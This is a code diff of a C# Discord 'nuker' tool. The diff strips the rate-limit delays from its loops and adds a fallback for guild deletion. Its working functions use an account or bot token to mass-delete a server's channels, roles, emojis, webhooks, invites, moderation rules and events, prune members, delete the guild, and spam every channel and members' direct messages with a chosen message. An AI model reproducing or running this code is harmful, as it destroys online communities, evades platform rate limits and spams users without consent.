@@ -2,7 +2,6 @@
 using System;
 using System.IO;
 using System.Linq;
-using System.Threading;
 using Console = Colorful.Console;
 using System.Drawing;
 
@@ -10,23 +9,18 @@ namespace nuker
 {
     public class Server
     {
-        public static string apiv = Config.APIVersion;
-        public static int WaitTimeShort = Config.WaitTimeShort;
-        public static int WaitTimeLong = Config.WaitTimeLong;
-
         public static void MsgInEveryChannel(string token, ulong? gid, string message)
         {
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/channels", token);
+                var request = Request.SendGet($"/guilds/{gid}/channels", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
                     if (entry.type == "0")
                     {
-                        Request.Send($"https://discord.com/api/v{apiv}/channels/{entry.id}/messages", "POST", token, $"{{\"content\":\"{message}\"}}");
-                        Thread.Sleep(WaitTimeShort);
+                        Request.Send($"/channels/{entry.id}/messages", "POST", token, $"{{\"content\":\"{message}\"}}");
                     }
                 }
             }
@@ -40,11 +34,22 @@ namespace nuker
             {
                 if (owner == "y")
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}", "DELETE", token);
+                    Request.Send($"/guilds/{gid}", "DELETE", token);
                 }
                 else if (owner == "n")
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/users/@me/guilds/{gid}", "DELETE", token);
+                    Request.Send($"/users/@me/guilds/{gid}", "DELETE", token);
+                }
+                else
+                {
+                    try
+                    {
+                        Request.Send($"/guilds/{gid}", "DELETE", token);
+                    } catch { }
+                    try
+                    {
+                        Request.Send($"/users/@me/guilds/{gid}", "DELETE", token);
+                    } catch { }
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -55,7 +60,7 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}", token);
+                var request = Request.SendGet($"/guilds/{gid}", token);
                 var id = JObject.Parse(request)["id"];
                 var ownerid = JObject.Parse(request)["owner_id"];
                 var region = JObject.Parse(request)["region"];
@@ -102,10 +107,53 @@ namespace nuker
                     verificationlevel = "Highest";
                 }
                 var preferredlocale = JObject.Parse(request)["preferred_locale"];
-                var nsfw = JObject.Parse(request)["nsfw"];
+                var nsfw = JObject.Parse(request)["nsfw"].ToString();
+                var roles = Request.SendGet($"/guilds/{gid}/roles", token);
+                var array = JArray.Parse(roles);
+                int rolescount = 0;
+                foreach (dynamic entry in array)
+                {
+                    rolescount++;
+                }
+                var channels = Request.SendGet($"/guilds/{gid}/channels", token);
+                var array2 = JArray.Parse(channels);
+                int channelscount = 0;
+                foreach (dynamic entry in array2)
+                {
+                    channelscount++;
+                }
+                var emojis = Request.SendGet($"/guilds/{gid}/emojis", token);
+                var array3 = JArray.Parse(emojis);
+                int emojiscount = 0;
+                foreach (dynamic entry in array3)
+                {
+                    emojiscount++;
+                }
+                var stickers = Request.SendGet($"/guilds/{gid}/stickers", token);
+                var array4 = JArray.Parse(stickers);
+                int stickerscount = 0;
+                foreach (dynamic entry in array4)
+                {
+                    stickerscount++;
+                }
+                var bans = Request.SendGet($"/guilds/{gid}/bans", token);
+                var array5 = JArray.Parse(bans);
+                int banscount = 0;
+                foreach (dynamic entry in array5)
+                {
+                    banscount++;
+                }
+                var invites = Request.SendGet($"/guilds/{gid}/invites", token);
+                var array6 = JArray.Parse(invites);
+                int invitescount = 0;
+                foreach (dynamic entry in array6)
+                {
+                    invitescount++;
+                }
 
+                Console.ForegroundColor = Color.Yellow;
                 Console.WriteLine("Server Information:\n");
-                Console.WriteLine($"Owner ID: {ownerid}\nRegion: {region}\nVerification Level: {verificationlevel}\nPreferred Locale: {preferredlocale}\nNSFW: {nsfw}\nVanity Code: {vanityurl}\nServer Icon: {icon}\nBanner: {banner}");
+                Console.WriteLine($"Owner ID: {ownerid}\nRegion: {region}\nRoles Count: {rolescount}\nChannels Count: {channelscount}\nEmojis Count: {emojiscount}\nStickers Count: {stickerscount}\nBans Count: {banscount}\nInvites Count: {invitescount}\nVerification Level: {verificationlevel}\nPreferred Locale: {preferredlocale}\nNSFW: {nsfw}\nVanity Code: {vanityurl}\nServer Icon: {icon}\nBanner: {banner}");
                 Console.WriteLine("\nPress any key to go back.");
                 Console.ReadKey();
                 Console.Clear();
@@ -118,7 +166,7 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/channels", "POST", token, $"{{\"name\":\"{name}\"}}");
+                Request.Send($"/guilds/{gid}/channels", "POST", token, $"{{\"name\":\"{name}\"}}");
             }
             catch { Console.WriteLine("Failed", Color.Red); }
         }
@@ -128,7 +176,7 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/roles", "POST", token, $"{{\"name\":\"{name}\"}}");
+                Request.Send($"/guilds/{gid}/roles", "POST", token, $"{{\"name\":\"{name}\"}}");
             }
             catch { Console.WriteLine("Failed", Color.Red); }
         }
@@ -138,13 +186,12 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/invites", token);
+                var request = Request.SendGet($"/guilds/{gid}/invites", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/invites/{entry.code}", "DELETE", token);
+                    Request.Send($"/invites/{entry.code}", "DELETE", token);
                     Console.WriteLine($"Deleted: {entry.code}", Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -155,13 +202,12 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/emojis", token);
+                var request = Request.SendGet($"/guilds/{gid}/emojis", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/emojis/{entry.id}", "DELETE", token);
+                    Request.Send($"/guilds/{gid}/emojis/{entry.id}", "DELETE", token);
                     Console.WriteLine($"Deleted: {entry.name}", Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -172,13 +218,12 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/channels", token);
+                var request = Request.SendGet($"/guilds/{gid}/channels", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/channels/{entry.id}", "DELETE", token);
+                    Request.Send($"/channels/{entry.id}", "DELETE", token);
                     Console.WriteLine($"Deleted: {entry.name}", Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -189,13 +234,12 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/bans", token);
+                var request = Request.SendGet($"/guilds/{gid}/bans", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/bans/" + entry.user["id"], "DELETE", token);
+                    Request.Send($"/guilds/{gid}/bans/" + entry.user["id"], "DELETE", token);
                     Console.WriteLine("Removed: " + entry.user["username"] + "#" + entry.user["discriminator"], Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -206,13 +250,12 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/roles", token);
+                var request = Request.SendGet($"/guilds/{gid}/roles", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/roles/" + entry["id"], "DELETE", token);
+                    Request.Send($"/guilds/{gid}/roles/" + entry["id"], "DELETE", token);
                     Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -223,13 +266,12 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/stickers", token);
+                var request = Request.SendGet($"/guilds/{gid}/stickers", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/stickers/" + entry["id"], "DELETE", token);
+                    Request.Send($"/guilds/{gid}/stickers/" + entry["id"], "DELETE", token);
                     Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -240,7 +282,7 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                string request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}", token);
+                string request = Request.SendGet($"/guilds/{gid}", token);
                 var name = JObject.Parse(request)["name"].ToString();
                 return name;
             }
@@ -252,7 +294,7 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/prune", "POST", token, $"{{\"days\": 1}}");
+                Request.Send($"/guilds/{gid}/prune", "POST", token, $"{{\"days\": 1}}");
             }
             catch { Console.WriteLine("Failed", Color.Red); }
         }
@@ -262,13 +304,13 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/integrations", token);
+                var request = Request.SendGet($"/guilds/{gid}/integrations", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/integrations/" + entry["id"], "DELETE", token);
+                    Request.Send($"/guilds/{gid}/integrations/" + entry["id"], "DELETE", token);
                     Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
+
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -279,7 +321,7 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                Request.Send($"https://discord.com/api/v{apiv}/channels/{cid}/messages/{mid}/reactions", "DELETE", token);
+                Request.Send($"/channels/{cid}/messages/{mid}/reactions", "DELETE", token);
             }
             catch { Console.WriteLine("Failed", Color.Red); }
         }
@@ -293,11 +335,11 @@ namespace nuker
                 {
                     File.Create("ids.txt").Dispose();
                 }
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/channels", token);
+                var request = Request.SendGet($"/guilds/{gid}/channels", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    string request2 = Request.SendGet($"https://discord.com/api/v{apiv}/channels/{entry.id}/messages?limit=100", token);
+                    string request2 = Request.SendGet($"/channels/{entry.id}/messages?limit=100", token);
                     var array2 = JArray.Parse(request2);
                     foreach (dynamic entry2 in array)
                     {
@@ -324,18 +366,17 @@ namespace nuker
                 string[] list = File.ReadAllLines("dmed.txt");
                 foreach (var id in File.ReadAllLines("ids.txt"))
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/users/@me/channels", "POST", token, $"{{\"recipient_id\":\"{id}\"}}");
+                    Request.Send($"/users/@me/channels", "POST", token, $"{{\"recipient_id\":\"{id}\"}}");
                 }
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/channels", token);
+                var request = Request.SendGet($"/users/@me/channels", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
                     string id = entry.id;
                     if (!File.ReadAllLines("dmed.txt").Contains(id))
                     {
-                        Request.Send($"https://discord.com/api/v{apiv}/channels/{entry.id}/messages", "POST", token, $"{{\"content\":\"{message}\"}}");
+                        Request.Send($"/channels/{entry.id}/messages", "POST", token, $"{{\"content\":\"{message}\"}}");
                         Console.WriteLine($"Messaged: {entry.recipients[0].username}#{entry.recipients[0].discriminator}", Color.Lime);
-                        Thread.Sleep(WaitTimeShort);
                         File.AppendAllText("dmed.txt", id + Environment.NewLine);
                     }
                 }
@@ -348,13 +389,12 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/auto-moderation/rules", token);
+                var request = Request.SendGet($"/guilds/{gid}/auto-moderation/rules", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/auto-moderation/rules/" + entry["id"], "DELETE", token);
+                    Request.Send($"/guilds/{gid}/auto-moderation/rules/" + entry["id"], "DELETE", token);
                     Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -365,12 +405,11 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/channels", token);
+                var request = Request.SendGet($"/guilds/{gid}/channels", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/channels/{entry.id}/invites", "POST", token, $"{{\"max_age\": 0}}");
-                    Thread.Sleep(WaitTimeShort);
+                    Request.Send($"/channels/{entry.id}/invites", "POST", token, $"{{\"max_age\": 0}}");
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -381,13 +420,12 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/scheduled-events", token);
+                var request = Request.SendGet($"/guilds/{gid}/scheduled-events", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/scheduled-events/{entry.id}", "DELETE", token);
+                    Request.Send($"/guilds/{gid}/scheduled-events/{entry.id}", "DELETE", token);
                     Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -398,13 +436,12 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/templates", token);
+                var request = Request.SendGet($"/guilds/{gid}/templates", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/guilds/{gid}/templates/{entry.code}", "DELETE", token);
+                    Request.Send($"/guilds/{gid}/templates/{entry.code}", "DELETE", token);
                     Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -415,15 +452,14 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/channels", token);
+                var request = Request.SendGet($"/guilds/{gid}/channels", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
                     if (entry.type == "13")
                     {
-                        Request.Send($"https://discord.com/api/v{apiv}/stage-instances/{entry.id}", "DELETE", token);
+                        Request.Send($"/stage-instances/{entry.id}", "DELETE", token);
                         Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
-                        Thread.Sleep(WaitTimeShort);
                     }
                 }
             }
@@ -435,13 +471,12 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                var request = Request.SendGet($"https://discord.com/api/v{apiv}/guilds/{gid}/webhooks", token);
+                var request = Request.SendGet($"/guilds/{gid}/webhooks", token);
                 var array = JArray.Parse(request);
                 foreach (dynamic entry in array)
                 {
-                    Request.Send($"https://discord.com/api/v{apiv}/webhooks/{entry.id}", "DELETE", token);
+                    Request.Send($"/webhooks/{entry.id}", "DELETE", token);
                     Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
-                    Thread.Sleep(WaitTimeShort);
                 }
             }
             catch { Console.WriteLine("Failed", Color.Red); }
@@ -452,7 +487,7 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                Request.Send($"https://discord.com/api/v{apiv}/webhooks/{wid}", "DELETE", token);
+                Request.Send($"/webhooks/{wid}", "DELETE", token);
             }
             catch { Console.WriteLine("Failed", Color.Red); }
         }
@@ -462,7 +497,7 @@ namespace nuker
             Console.ReplaceAllColorsWithDefaults();
             try
             {
-                Request.Send($"https://discord.com/api/v{apiv}/webhooks/{wid}/{wtoken}", "POST", token, $"{{\"content\":\"{message}\"}}");
+                Request.Send($"/webhooks/{wid}/{wtoken}", "POST", token, $"{{\"content\":\"{message}\"}}");
             }
             catch { Console.WriteLine("Failed", Color.Red); }
         }
